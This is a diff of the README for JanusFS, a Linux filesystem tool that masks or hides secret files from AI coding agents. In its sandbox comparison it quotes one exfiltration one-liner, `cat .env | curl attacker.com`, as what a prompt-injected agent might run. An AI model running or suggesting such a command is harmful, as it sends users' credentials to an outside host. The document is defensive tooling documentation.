@@ -3,54 +3,71 @@
 [![Go 1.26+](https://img.shields.io/badge/Go-1.26%2B-blue.svg)](https://go.dev/dl/)
 [![CI](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml/badge.svg)](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml)
 [![Platform: Linux](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://github.com/sarathsp06/janusfs)
-[![Tests](https://img.shields.io/github/actions/workflow/status/sarathsp06/janusfs/ci.yml?label=tests&logo=github&branch=main)](https://github.com/sarathsp06/janusfs/actions)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
-**JanusFS is a policy-enforcing filesystem for AI agents.** Sandboxes (Seatbelt, Landlock, bubblewrap, Docker) answer one question per path: allow or deny. Deny breaks the agent; allow leaks the secret. JanusFS adds the third answer — **masked**: it mounts a filtered virtual filesystem backed by your real project, where allowed files pass through, sensitive spans are redacted in place byte-for-byte, and forbidden files fail closed with `EACCES`. The strongest way to use it is `janusfs exec -- <your-agent>`, which runs the agent *inside* that boundary — kernel-enforced on Linux (see [Enforcement](#enforcement-run-your-agent-inside-the-boundary)) — and it composes with whatever sandbox you already run.
+**JanusFS is a policy-enforcing filesystem for AI agents.** Sandboxes (Seatbelt, Landlock, bubblewrap, Docker) answer one question per path: allow or deny. Deny breaks the agent; allow leaks the secret. JanusFS adds the third answer — **masked**: a filtered virtual filesystem backed by your real project, where allowed files pass through, sensitive spans are redacted in place byte-for-byte, and forbidden files fail closed with `EACCES`. Run it as `janusfs exec -- <your-agent>` and the agent lives *inside* that boundary — kernel-enforced on Linux — composing with whatever sandbox you already run.
 
 ![JanusFS — Filesystem boundary illustration](docs/janus_art.png)
 
-> In Roman myth, Janus is the two-faced god of doorways and transitions — he looks both ways. JanusFS stands at the doorway between your code and any untrusted agent, deciding what crosses the filesystem boundary and which face of each file is safe to show.
+> In Roman myth, Janus is the two-faced god of doorways — he looks both ways. JanusFS stands at the doorway between your code and any untrusted agent, deciding which face of each file is safe to show.
 
-## In one minute
+## Quickstart
 
-- Point JanusFS at a real source directory, then point your agent at the policy-enforced mountpoint instead of the source.
-- Configure policy in one human-editable `.janusfs.yml`: `hide` blocks paths, `mask` redacts secrets inside otherwise useful files.
-- Policy is enforced on every open, read, and directory listing; real files are never modified.
-- Allowed reads pass through, Masked reads are byte-length-preserving redacted reads, and Hidden reads fail closed.
-- A single local **daemon** process runs in the background and owns all active FUSE mounts. Your CLI commands (`janusfs mount`/`umount`) are short-lived, returning immediately. The daemon serves a single consolidated dashboard exposing all mounts and their statistics under a single unified port.
-- **Linux-only, kernel-enforced.** `janusfs exec -- <your-agent>` runs the agent in a private mount namespace where the filtered view *replaces* the source at its own path — a real boundary, exercised by CI on every change. `janusfs mount`/`exec` refuse at runtime on non-Linux hosts; to use JanusFS on a Mac or Windows box, run it inside a Linux VM/container. JanusFS is a redaction boundary that composes with your sandbox, not a sandbox itself.
+JanusFS runs on **Linux only**. On a Mac or Windows, run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) launched with `--device /dev/fuse --cap-add SYS_ADMIN`.
 
----
+```bash
+# 1) install the FUSE runtime
+sudo apt-get install -y fuse3 libfuse3-dev        # Debian/Ubuntu
+# sudo dnf install -y fuse3 fuse3-devel           # RHEL/Fedora
 
-## Contents
+# 2) install JanusFS (or grab a Linux tarball from GitHub Releases)
+go install github.com/sarathsp06/janusfs/cmd/janusfs@latest
 
-- [Why](#why)
-- [How it works](#how-it-works-flow-diagram)
-- [Enforcement](#enforcement-run-your-agent-inside-the-boundary)
-- [The problem](#the-problem)
-- [Architecture](#architecture)
-- [Quickstart](#quickstart)
-- [The daemon](#the-daemon)
-- [The three faces](#the-three-faces)
-- [Configuration files](#configuration-files)
-  - [`.janusfs.yml`](#janusfsyml)
-  - [Global rules](#global-rules-machine-wide-defaults)
-- [Built-in patterns](#built-in-patterns)
-- [CLI reference](#cli-reference)
-- [Security model](#security-model)
-- [Comparison to alternatives](#comparison-to-alternatives)
-- [Development Guide](docs/DEVELOPMENT.md)
-- [Status](#status)
-- [License](#license)
+# 3) seed secure defaults and preview before you mount
+cd my-project
+janusfs init                     # writes a .janusfs.yml template
+janusfs check --secrets          # warn about likely secrets still readable
+janusfs explain .env             # trace which rule decides a file's fate
+
+# 4) run your agent INSIDE the boundary (strongest: kernel-enforced)
+janusfs exec -- aider            # the agent + everything it spawns sees the filtered view
+janusfs exec --net=none -- aider # …and cannot reach the network to exfiltrate what it read
+```
+
+That's it. Inside the view, `cat .env` yields `API_KEY=****` (same length), `.env` still lists with its real size, and a hidden `id_rsa` fails closed:
+
+```bash
+$ cat .env
+API_KEY=****************************
+$ cat id_rsa
+cat: id_rsa: Permission denied
+```
+
+Prefer a persistent mount over `exec`? `janusfs daemon --background` then `janusfs mount .` gives you a long-lived mountpoint and a dashboard — see [The daemon](#the-daemon).
+
+## Features
+
+- **Three faces per file, not two.** `allow` passes through, `hide` fails closed (`EACCES`), `mask` redacts secret spans **byte-for-byte** (`*`) so file sizes and offsets never change and tooling stays intact. Precedence is strict: `Hidden > Masked > Allowed`.
+- **Kernel-enforced boundary.** `janusfs exec -- <agent>` runs the whole process tree in a private mount namespace where the filtered view *replaces* the source at its own path — `git`, `npm`, `grep`, every child inherit it, and no child can reach the unfiltered tree by any path.
+- **Optional network isolation.** `janusfs exec --net=none` runs the agent with no network at all (loopback only), kernel-enforced — so bytes it read cannot be exfiltrated. Deny-all, opt-in; default is `host` (no isolation).
+- **One config you already understand.** A single `.janusfs.yml` with `.gitignore`-style globs plus a named pattern library (`env-value`, `aws-key`, `jwt`, …). Machine-wide defaults live in `~/.janusfs/config/`.
+- **Fail-closed, always.** Any parser error, cache fault, or redactor panic resolves the path to Hidden — never raw bytes. Real files are never modified; redacted bytes live only in RAM.
+- **Daemon + dashboard.** One background daemon owns every mount, resumes them after a reboot, and serves a single dashboard at `http://127.0.0.1:7381/`. CLI commands are short-lived and return immediately.
+- **Composes with your sandbox.** JanusFS masks *bytes*; a sandbox protects the *machine*. Run `janusfs exec` inside Seatbelt/Landlock/bubblewrap/Docker — they answer allow/deny, JanusFS answers "masked".
 
 ## Why
 
-The repository root is a threshold: it holds both code the agent should reason about and secrets the agent must never see. JanusFS turns that threshold into an explicit filesystem policy boundary, deciding per-path and per-read whether to hand the agent the real bytes, a redacted version, or nothing at all.
+The repository root is a threshold: it holds both code the agent should reason about and secrets it must never see — `.env`, private keys, cloud configs. The obvious workarounds all fail:
 
-## How it works (flow diagram)
+- **Blanket-deny** a directory and the agent breaks when it legitimately needs to know a file exists.
+- **Blanket-allow** and secrets leak on the first `cat`, `grep`, or `find`.
+- **Scrub before hand-off** and any later read — or a fresh read after the scrub — still has the raw bytes.
 
-Here is a layered view of exactly what JanusFS does when an agent reads a file:
+JanusFS resolves this per-file, per-read, at the FS boundary, through one code path that fails **closed** on any error.
+
+## How it works
+
+When an agent reads a file, JanusFS resolves one of three decisions against a compiled policy snapshot:
 
 ```mermaid
 flowchart LR
@@ -68,8 +85,6 @@ flowchart LR
   Disk --> Agent
 ```
 
-If your renderer does not support Mermaid diagrams, here is a plain-text fallback:
-
 ```text
 Agent -> JanusFS -> decision:
 - ALLOWED -> passthrough to disk -> agent sees raw bytes
@@ -77,59 +92,7 @@ Agent -> JanusFS -> decision:
 - HIDDEN  -> deny (EACCES) -> agent cannot read
 ```
 
-
-## Enforcement: run your agent inside the boundary
-
-Pointing an agent *at* the mountpoint is only as good as the agent's discipline — nothing stops a process from reaching the real source at its own path. To get a boundary the agent cannot step around, put the agent's whole process tree inside the filtered view. That is what `janusfs exec` does **on Linux**, and it is the strongest way to run JanusFS:
-
-```bash
-# Linux: run the command (and everything it spawns) inside the kernel-enforced view
-janusfs exec -- aider           # or a shell, a test run, any CLI
-```
-
-**Own the process tree, not one channel.** An agent has many ways to touch the filesystem — its `read_file` tool, its Bash tool, `git`, a build, a subprocess. Filtering any single one of those leaves the others open. On Linux `janusfs exec` confines the *entire* subprocess tree at once, so `git`, `npm`, `grep`, and every child inherit the filtered view transitively — allowed files pass through, masked files read as `****`, hidden files fail closed — with no per-tool wiring and no way for a child to opt out.
-
-### One boundary, kernel-enforced
-
-- **Linux — kernel-enforced.** `janusfs exec` runs the command in a private mount namespace (`CLONE_NEWNS`) where the filtered view *replaces* the source at its own path, for both read and write. From inside, the unfiltered tree does not exist; a subprocess cannot reach it by any path. No daemon required, no path rewriting. (One consequence of the user namespace: the command sees itself as uid 0 — see `janusfs exec --help`.)
-- **Non-Linux — refused.** JanusFS enforces only on Linux. `janusfs mount` and `janusfs exec` error out on macOS, Windows, and other OSes rather than pretend an advisory mount is a boundary. To use JanusFS on a Mac, run the agent in a Linux container/VM and use `janusfs exec` inside it (below); for a deny boundary on the Mac host itself, use your harness's own sandbox (Codex CLI, Gemini CLI, and Claude Code all ship Seatbelt-based confinement).
-
-> **Wrapping an interactive editor or IDE is not the same as wrapping a headless agent.** `janusfs exec -- <your-editor>` puts *your own* tools inside the filtered view too, so a masked file you edit and `git add` stages `****` into real git (see the caveat below). `janusfs exec` is designed for headless agent/CLI runs; whether a specific agent harness even functions inside the Linux namespace (config/auth/network under a user namespace) is per-harness and not yet validated here — test yours before relying on it.
-
-### Why not just a sandbox?
-
-Sandboxes and JanusFS answer different questions. A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Concretely: deny `.env` under Landlock and the agent breaks when it legitimately needs to know the file's shape; allow it, and the day a prompt injection lands, `cat .env | curl attacker.com` exfiltrates it through a channel no per-tool filter sees. Under JanusFS the raw bytes never enter the process tree at all — `cat .env` yields `API_KEY=****`, same length, file listable, tooling intact. Run both: the sandbox denies the network and the machine, JanusFS masks the secrets.
-
-```bash
-# compose: your harness's sandbox (or a devcontainer) outside, janusfs inside
-janusfs exec -- claude      # inside a devcontainer: add --device /dev/fuse to runArgs
-```
-
-> **Not on Linux?** JanusFS runs on Linux only. On a Mac or Windows, run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) with `--device /dev/fuse --cap-add SYS_ADMIN`, and use `janusfs exec` there.
-
-
-> **One caveat that applies to every enforced-view design:** because `.git/` passes through to the real object store, running `git add` on a *masked* file inside the view stages the `****` bytes into real git. JanusFS warns loudly: `janusfs check` reports every masked file git would stage, and `janusfs exec` prints the same warning before the child starts. Keep secret files out of the agent's commits (they are typically `.gitignore`d), or give the agent a scratch clone.
-
-
-## The problem
-
-AI coding agents need broad filesystem read access to be useful — and that access routinely includes `.env` files, private keys, credentials, cloud configs, and other things that should never end up in a prompt or a model's context.
-
-The obvious workarounds all fail in some way:
-
-- **Blanket-denying whole directories** breaks agents that legitimately need to see, for example, that `.env` exists to reference it in code.
-- **Blanket-allowing everything** leaks secrets on the first `cat`, `grep`, or `find`.
-- **Scrubbing before hand-off** is a one-shot: any file the agent touches later — or a fresh read after the scrub — still has the raw bytes.
-
-JanusFS resolves this per-file, per-read, at the FS boundary. Rules use `.gitignore`-style globs plus a named pattern library — syntax your users already know — and every enforcement decision goes through one code path that fails **closed** on any error.
-
-## Architecture
-
-A long-running **daemon** owns every mount. You drive it with short-lived CLI
-commands (`janusfs mount`/`umount`) that talk to it over a local unix socket
-and return immediately; the daemon holds the FUSE mounts, resumes them after a
-reboot, and serves one dashboard for all of them. The agent only ever touches
-the mountpoint — where each file wears one of three faces.
+A long-running **daemon** owns every mount. You drive it with short-lived CLI commands that talk to it over a local unix socket and return immediately; the daemon holds the FUSE mounts, resumes them after a reboot, and serves one dashboard for all of them. The agent only ever touches the mountpoint.
 
 ```
   ┌─ you (trusted) ─────────────┐          ┌─ agent (untrusted) ─────────┐
@@ -155,213 +118,39 @@ the mountpoint — where each file wears one of three faces.
                                             Real files on disk (never modified)
 ```
 
-The rule engine reads `.janusfs.yml` from the mount root down (and from `~/.janusfs/config/` if it exists — see [Global rules](#global-rules-machine-wide-defaults)) and compiles policy into an immutable snapshot. Every open, read, and readdir consults that snapshot. Redaction is **byte-length preserving** (`*` replaces every masked byte), so file sizes and offsets stay identical — tools don't see short reads and don't get confused. Any error — parser failure, missing rules, anything — resolves to **Hidden**.
+The engine reads `.janusfs.yml` from the mount root down (and `~/.janusfs/config/` if present) and compiles policy into an immutable snapshot. Every open, read, and readdir consults that snapshot. Redaction is **byte-length preserving** (`*` replaces every masked byte), so sizes and offsets stay identical. Any error resolves to **Hidden**.
 
-## Quickstart
+## Enforcement: run your agent inside the boundary
 
-### 1) Install FUSE and JanusFS
+Pointing an agent *at* a mountpoint is only as good as the agent's discipline — nothing stops a process from reaching the real source at its own path. To get a boundary the agent cannot step around, put its whole process tree inside the filtered view. That is `janusfs exec`, and it is the strongest way to run JanusFS.
 
-#### Install FUSE runtime (Required, Linux)
+**Own the process tree, not one channel.** An agent has many ways to touch the filesystem — its `read_file` tool, its Bash tool, `git`, a build, a subprocess. Filtering any single one leaves the others open. On Linux `janusfs exec` confines the *entire* subprocess tree at once: `git`, `npm`, `grep`, and every child inherit the filtered view transitively — allowed files pass through, masked files read as `****`, hidden files fail closed — with no per-tool wiring and no way for a child to opt out.
 
-JanusFS runs on Linux only.
+Concretely, `janusfs exec` runs the command in a private mount namespace (`CLONE_NEWNS`) where the filtered view *replaces* the source at its own path, for both read and write. From inside, the unfiltered tree does not exist. No daemon required, no path rewriting. (One consequence of the user namespace: the command sees itself as uid 0 — see `janusfs exec --help`.)
 
-- **Ubuntu/Debian:** `sudo apt-get install -y fuse3 libfuse3-dev`
-- **RedHat/CentOS:** `sudo dnf install -y fuse3 fuse3-devel`
+### Network isolation (`--net=none`)
 
-On macOS or Windows, run JanusFS inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) with `--device /dev/fuse --cap-add SYS_ADMIN`.
-
-#### Install JanusFS binary
-- **Via Precompiled Release Binaries:** Download the latest Linux tarball for your architecture from the [GitHub Releases](https://github.com/sarathsp06/janusfs/releases) page, extract the `janusfs` binary, and move it to a directory in your `$PATH` (e.g., `/usr/local/bin`).
-- **Via Go Toolchain:**
-  ```bash
-  go install github.com/sarathsp06/janusfs/cmd/janusfs@latest
-  ```
-
-### 2) Quickstart Setup & Usage
+Masking keeps secret *bytes* out of the agent; a network boundary keeps whatever it *did* read from leaving the box. `janusfs exec --net=none` runs the command in a network namespace with only a loopback interface and no external route — deny-all, kernel-enforced:
 
 ```bash
-# 2) drop secure defaults into your project
-cd my-project
-janusfs init                    # writes a .janusfs.yml template
-
-# Optional: choose a custom mount root instead of ~/.janusfs/mounts
-janusfs install --root ~/.janusfs/mounts
-
-# 4) preview what those rules will do BEFORE you mount
-janusfs check --secrets         # linter + opt-in heuristic scan for likely Allowed secrets
-janusfs check --matches         # preview Hidden/Masked policy matches
-janusfs explain .env            # per-file trace: which rule decided this file's fate
-
-# 5) start the daemon (owns mounts, serves the dashboard, resumes past mounts)
-janusfs daemon --background     # detaches, logs to ~/.janusfs/logs/daemon.log
-#                               # (or `janusfs daemon` to run in the foreground; `janusfs logs -f` to tail)
-
-# 6) mount — returns immediately; the daemon keeps it alive
-janusfs mount .
-# prints the mountpoint + dashboard URL. Point your agent at that mountpoint,
-# never at the real path. Unmount later with:  janusfs umount .
+janusfs exec --net=none -- aider     # no network at all; loopback only
+janusfs exec --net=host -- aider     # share the host network (default; no isolation)
 ```
 
-**Platform-specific confinement, read this before you decide how to launch your agent:**
+The default when `--net` is omitted resolves `JANUSFS_EXEC_NET` → `exec_net` in `~/.janusfs/settings.json` → `host`. This is deny-all, not an egress allowlist (reach some hosts, not others) — that is the container's job. See [`SPEC.md`](SPEC.md) §20.
 
-- **Linux** has a real, kernel-enforced boundary: `janusfs exec -- <agent>` runs the agent in a private mount namespace where the filtered view *replaces* the source at its own path. The agent cannot reach the unfiltered tree by any path, because from inside that namespace the unfiltered tree doesn't exist.
-- **Non-Linux is unsupported.** `janusfs mount` and `janusfs exec` refuse to run off Linux rather than offer an advisory mount that is not a boundary. A path-preserving macOS mode was considered and rejected — an evadable daemon-side heuristic cannot compete with the vendor-signed sandbox your harness already ships (see `SPEC.md` §20). If your threat model requires that an agent genuinely cannot reach a secret by any path, run it in a Linux container — that is the supported answer.
+### Why not just a sandbox?
 
-By default, the mountpoint mirrors the source's full path under your mount root
-(e.g. `~/.janusfs/mounts/Users/you/my-project`), so two sources never collide
-and the location is fully predictable. If that path is too hostile for a tool or
-agent harness, pass an explicit mountpoint (`janusfs mount ~/proj ~/pv`) and use
-that shorter path. To give a mount a friendly name in the dashboard, pass
-`--name "My Project"`; it's a display label only and never changes the path.
-
-Every file that reaches the agent has been filtered (`$MP` is the mountpoint `janusfs mount` printed):
+Sandboxes and JanusFS answer different questions. A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Deny `.env` under Landlock and the agent breaks when it legitimately needs the file's shape; allow it, and the day a prompt injection lands, `cat .env | curl attacker.com` exfiltrates it through a channel no per-tool filter sees. Under JanusFS the raw bytes never enter the process tree at all. Run both: the sandbox denies the machine, JanusFS masks the secrets.
 
 ```bash
-$ cat "$MP/.env"
-API_KEY=****************************
-DEBUG=true
-
-$ cat "$MP/id_rsa"
-cat: id_rsa: Permission denied
-
-$ ls -la "$MP"                       # hidden files still LIST (with real sizes)
--rw-r--r--  ...   44 .env            #   so tools don't get confused
--rw-r--r--  ...  135 id_rsa          #   but reading fails closed
--rw-r--r--  ...  137 README.md       #   Allowed: passthrough
+# compose: your harness's sandbox (or a devcontainer) outside, janusfs inside
+janusfs exec -- claude      # inside a devcontainer: add --device /dev/fuse to runArgs
 ```
 
-## The daemon
+> **Two caveats.** (1) Wrapping an interactive editor is not the same as wrapping a headless agent: `janusfs exec -- <your-editor>` puts *your own* tools inside the view too, so a masked file you `git add` stages `****` into real git. (2) Because `.git/` passes through to the real object store, `git add` on a masked file stages the `****` bytes. JanusFS warns loudly — `janusfs check` and `janusfs exec` both report every masked file git would stage. Keep secret files out of the agent's commits (they are typically `.gitignore`d), or give the agent a scratch clone.
 
-`janusfs daemon` is the one long-running process. Everything else is a thin
-client that talks to it over `~/.janusfs/daemon.sock` and exits.
-
-- **Owns every mount.** Each mounted source runs inside the daemon as an OS-level FUSE mount. `janusfs mount <src>` hands the mount to the daemon and returns immediately — your terminal is free.
-- **Restart-safe.** `janusfs mount` records every successful mount in
-  `~/.janusfs/mounts.json`. `janusfs umount` removes that entry. If the daemon
-  is stopped or crashes without an explicit unmount, the registry entry remains
-  and the next `janusfs daemon` start remounts it automatically. Startup prunes
-  records whose source disappeared or cannot be recovered, so stale entries do
-  not accumulate forever.
-- **One consolidated server and port.** The daemon serves a combined index at
-  `http://127.0.0.1:7381/` listing every live mount, and routes individual mount
-  dashboards and API/V1 endpoints under subpaths (e.g., `http://127.0.0.1:7381/mounts/<uuid>/`). Change the port with `--ui-port`.
-- **Runs in the foreground or detached.** `janusfs daemon` runs in the
-  foreground (Ctrl-C to stop) — best for development. `janusfs daemon
-  --background` detaches from the terminal, redirects its output to
-  `~/.janusfs/logs/daemon.log`, and returns once the control socket is up;
-  `janusfs logs [-f]` tails that log.
-- **Clean shutdown.** Ctrl-C (or `SIGTERM`) unmounts everything and drains the
-  dashboard. If FUSE does not release a mount cleanly within the grace window,
-  JanusFS falls back to OS-level unmount commands
-  (`fusermount3`/`fusermount`/`umount` on Linux) to avoid stale mountpoints.
-
-```bash
-janusfs daemon --background # start it detached (or `janusfs daemon` in the foreground)
-janusfs logs -f            # tail the background daemon's log
-janusfs mount ~/proj       # hand a mount to the daemon; returns at once
-janusfs mount ~/proj ~/pv  # or mount at a short path you choose (existing empty dirs are OK)
-janusfs update ~/proj      # re-apply edited .janusfs.yml (no remount)
-janusfs path ~/proj        # print the mountpoint:  cd "$(janusfs path ~/proj)"
-janusfs umount ~/proj      # unmount by source path OR mountpoint
-janusfs mounts             # list active and recorded mounts
-janusfs paths              # show where settings, the registry, and rules live
-```
-
-There's no file watcher (watching a large tree burns inotify watches, and the
-native watch APIs that avoid that need cgo, which this project forbids) — but
-freshness is enforced at two different levels, and they're not
-the same guarantee:
-
-- **Content is always correct.** Every masked read revalidates the real
-  file's `(mtime, size, inode)` before serving, so a concurrent edit to the
-  file's *content* is always caught, on every single read.
-- **In-tree rule changes are picked up the next time anything is opened
-  near them.** Editing, or adding, a `.janusfs.yml` file on disk
-  takes effect automatically the next time a file or directory near it is
-  opened — no explicit action needed. If nothing gets opened after the edit
-  (e.g. an agent only keeps reading already-open handles), or you edit
-  **global** rules (`~/.janusfs/config/`), run `janusfs update` to force it
-  immediately (or click **Reload rules** in the dashboard, which also reloads
-  on save).
-
-If no daemon is running, `janusfs mount` says so; `janusfs umount` falls back to
-a direct OS-level unmount so a stray mount can still be cleaned up. Stopping the
-daemon does **not** remove `mounts.json` entries; only explicit `janusfs umount`
-means "do not resume this mount next time."
-
-## Recovering a stale or broken mount
-
-If you see errors like `device not configured`, `ENXIO`, or on Linux
-`Transport endpoint is not connected`, the kernel may still have a stale FUSE
-mount while the daemon has no live runtime for it. On daemon startup, JanusFS
-attempts to clear stale mountpoints and retry recorded mounts. The CLI also
-supports safe manual recovery.
-
-### 1. Try JanusFS first
-
-```bash
-janusfs umount <mountpoint-or-src>
-```
-
-This asks the running daemon to unmount and removes the mount from
-`~/.janusfs/mounts.json`. If the daemon is not running, JanusFS falls back to an
-OS-level unmount and still removes the registry entry.
-
-### 2. If the kernel mount remains, use OS tools
-
-Linux / FUSE:
-
-```bash
-fusermount3 -u <mountpoint> || fusermount -u <mountpoint> || umount <mountpoint>
-```
-
-If Linux reports `Transport endpoint is not connected`, use lazy detach:
-
-```bash
-fusermount3 -uz <mountpoint> || fusermount -uz <mountpoint> || umount -l <mountpoint>
-```
-
-After the unmount succeeds, the mountpoint directory can be removed normally if
-you no longer need it.
-
-### 3. Inspect JanusFS state
-
-```bash
-janusfs paths
-janusfs doctor
-cat ~/.janusfs/mounts.json
-```
-
-`doctor` reports stale pidfiles and runtime health. If a stale registry entry
-remains, prefer `janusfs umount <mountpoint>` so JanusFS prunes it; edit
-`~/.janusfs/mounts.json` by hand only as a last resort.
-
-
-## First-run checklist
-
-Before mounting for the first time, run this quick checklist to reduce friction:
-
-1. Ensure the FUSE runtime is installed (`fuse3`); JanusFS runs on Linux only.
-2. Seed secure defaults in your repo (or in `~/.janusfs/config`):
-
-   cd my-project
-   janusfs init
-
-3. Lint rules and preview effects before mounting:
-
-   janusfs check --secrets
-   janusfs explain .env
-
-4. Optional: customize the mount root if `~/.janusfs/mounts` is not right for
-   your workflow:
-
-   janusfs install --root ~/janus-mounts
-
-5. Start the daemon and bring the mount up:
-
-   janusfs daemon --background
-   janusfs mount .
-
+**Non-Linux is refused, not faked.** `janusfs mount` and `janusfs exec` error out on macOS, Windows, and other OSes rather than pretend an advisory mount is a boundary. A path-preserving macOS mode was considered and rejected (see [`SPEC.md`](SPEC.md) §20). To use JanusFS on a Mac, run the agent in a Linux container/VM and use `janusfs exec` inside it.
 
 ## The three faces
 
@@ -374,7 +163,7 @@ Before mounting for the first time, run this quick checklist to reduce friction:
 **Precedence is strict:** `Hidden > Masked > Allowed`.
 **Fail-closed:** any rule-resolution or parser error resolves that path to Hidden.
 
-## Configuration files
+## Configuration
 
 ### `.janusfs.yml`
 
@@ -440,9 +229,9 @@ Set rules that apply to every mount on your machine — for personal always-hide
 janusfs init --global    # writes ~/.janusfs/config/.janusfs.yml
 ```
 
-Global rules are treated as an **ancestor level above every mount root**, and act as a **fail-closed floor**: a repo's own rules (including negation) can freely override each other as usual, but no in-tree rule may re-include a path the global level Hid, or un-mask a path it Masked. `janusfs check`/`explain` flag any in-tree negation that has no effect for this reason.
+Global rules are treated as an **ancestor level above every mount root**, and act as a **fail-closed floor**: a repo's own rules can freely override each other as usual, but no in-tree rule may re-include a path the global level Hid, or un-mask a path it Masked. `janusfs check`/`explain` flag any in-tree negation that has no effect for this reason.
 
-The `.janusfs` directory layout mirrors other JanusFS on-disk state:
+The `.janusfs` directory layout:
 
 ```
 ~/.janusfs/
@@ -468,42 +257,68 @@ Reserved names — user `/regex/` cannot shadow these. Every builtin is unit-tes
 | `generic-secret`  | `password:` / `secret:` / `api-key:` values (6+ chars) |
 | `whole-file`      | sentinel: mask every byte                              |
 
-Print the exact regexes JanusFS uses with:
+Print the exact regexes with `janusfs patterns` (or `--json`).
+
+## The daemon
+
+`janusfs daemon` is the one long-running process; everything else is a thin client that talks to it over `~/.janusfs/daemon.sock` and exits.
+
+- **Owns every mount.** `janusfs mount <src>` hands the mount to the daemon and returns immediately — your terminal is free.
+- **Restart-safe.** Every successful mount is recorded in `~/.janusfs/mounts.json`; the next daemon start remounts it automatically. `janusfs umount` removes the entry. Startup prunes records whose source disappeared.
+- **One port.** A combined index at `http://127.0.0.1:7381/` lists every live mount and routes per-mount dashboards/APIs under subpaths. Change it with `--ui-port`.
+- **Foreground or detached.** `janusfs daemon` runs in the foreground (Ctrl-C to stop); `--background` detaches, logs to `~/.janusfs/logs/daemon.log`, and returns once the socket is up (`janusfs logs -f` tails it).
+- **Clean shutdown.** Ctrl-C/`SIGTERM` unmounts everything; if FUSE won't release cleanly it falls back to `fusermount3`/`fusermount`/`umount`.
 
 ```bash
-janusfs patterns
-janusfs patterns --json
+janusfs daemon --background # start it detached
+janusfs logs -f            # tail the daemon log
+janusfs mount ~/proj       # hand a mount to the daemon; returns at once
+janusfs mount ~/proj ~/pv  # or mount at a short path you choose
+janusfs update ~/proj      # re-apply edited .janusfs.yml (no remount)
+janusfs path ~/proj        # print the mountpoint: cd "$(janusfs path ~/proj)"
+janusfs umount ~/proj      # unmount by source path OR mountpoint
+janusfs mounts             # list active and recorded mounts
 ```
 
-Example:
+By default the mountpoint mirrors the source's full path under your mount root (e.g. `~/.janusfs/mounts/home/you/my-project`), so two sources never collide. Pass an explicit mountpoint (`janusfs mount ~/proj ~/pv`) for a shorter path, or `--name "My Project"` for a dashboard label.
 
-```text
-NAME            MASKS                                      REGEX
-generic-secret  password/secret/token/api-key assignments  (?im)\b(?:password|passwd|secret|token|api[_-]?key)\b\s*[:=]\s*["']?([^\s"']{6,})
-whole-file      Masks every byte of the file; no regex...   —
+There's no file watcher (watching a large tree burns inotify watches, and the cgo-free native APIs are forbidden here) — freshness is enforced at two levels:
+
+- **Content is always correct.** Every masked read revalidates the real file's `(mtime, size, inode)` before serving, so a concurrent content edit is always caught.
+- **In-tree rule changes** are picked up the next time anything is opened near them. If nothing is opened after the edit, or you edit **global** rules, run `janusfs update` (or click **Reload rules** in the dashboard).
+
+### Recovering a stale or broken mount
+
+If you see `device not configured`, `ENXIO`, or `Transport endpoint is not connected`, the kernel may hold a stale FUSE mount. Daemon startup clears these automatically; to do it by hand:
+
+```bash
+janusfs umount <mountpoint-or-src>                                          # ask the daemon (or OS fallback)
+fusermount3 -u <mountpoint> || fusermount -u <mountpoint> || umount <mp>    # if the kernel mount remains
+fusermount3 -uz <mountpoint> || umount -l <mountpoint>                       # lazy detach if "not connected"
+janusfs doctor                                                              # inspect runtime health
 ```
 
 ## CLI reference
 
 | Command | Purpose |
 |---------|---------|
-| `janusfs install` | Optional setup: choose a custom mount root with `--root` or an interactive prompt (saved to `~/.janusfs/settings.json`). Without it, JanusFS uses `~/.janusfs/mounts`. `--global-rules` also seeds `~/.janusfs/config/`. |
-| `janusfs daemon` | Run the long-lived daemon: owns every mount, resumes recorded ones, serves the combined dashboard, accepts client commands. `--background` detaches and logs to `~/.janusfs/logs/daemon.log`; `--ui-port` (default 7381), `--no-open`, `--debug`. Ctrl-C unmounts everything. |
-| `janusfs logs [-f]` | Show the background daemon's log (`~/.janusfs/logs/daemon.log`); `-f` follows it like `tail -f`. |
-| `janusfs mount <src> [mountpoint]` | Ask the daemon to mount a policy-enforced virtual filesystem and return immediately. With no `[mountpoint]` the path mirrors `<src>` under the mount root; pass an explicit `[mountpoint]` to mount at a short path you choose. `--name "<label>"` sets a friendly dashboard name only. |
-| `janusfs mounts [--json]` | List active daemon mounts plus recorded mount entries, including `mounted`, `recorded`, `missing-src`, `stale`, and `error` status. |
-| `janusfs update [src\|mountpoint\|configpath]` | Re-apply edited `.janusfs.yml` rules without remounting. The argument may be the source, mountpoint, or a config/file path inside either tree (no arg = all mounts). |
-| `janusfs path <src>` | Print the mountpoint for a mounted source, for `cd "$(janusfs path <src>)"`. |
-| `janusfs umount <mountpoint\|src>` | Unmount via the daemon, by mountpoint or source path. Also prunes a stale registry entry / lingering mount; falls back to a direct OS unmount if no daemon is running. |
-| `janusfs paths` | List the config/data paths JanusFS uses (settings, mounts registry, global policy, mount root) and whether each exists. |
-| `janusfs init [dir]` | Write secure-default `.janusfs.yml` to `[dir]` (default cwd). `--global` writes to `~/.janusfs/config/` instead. |
-| `janusfs check [path]` | Static linter for the things that indicate a real mistake: unknown builtins, bad regex (reported with its fail-closed-to-Hidden consequence), directory-mask globs that can never mask, and negations that have no effect (blocked by a hidden ancestor or the global floor). Does **not** flag a rule that merely matches no files today — a defensive pattern for files that don't exist yet is intended. Add `--secrets` for an opt-in heuristic scan that warns about likely secret files/content currently resolving Allowed. Add `--matches` to list files/directories currently resolving Hidden or Masked; `--json` includes matches when requested. |
-| `janusfs patterns` | List every reserved built-in `.janusfs.yml` mask pattern name with its description and exact regex source. `--json` for machine-readable output. |
-| `janusfs explain <path>` | Trace: why does one path resolve the way it does? Prints every rule that contributed. `--json` supported; `--root` selects the mount root (default cwd). |
-| `janusfs doctor` | Runtime health: FUSE status, active mounts, and stale-mount / watchdog checks. |
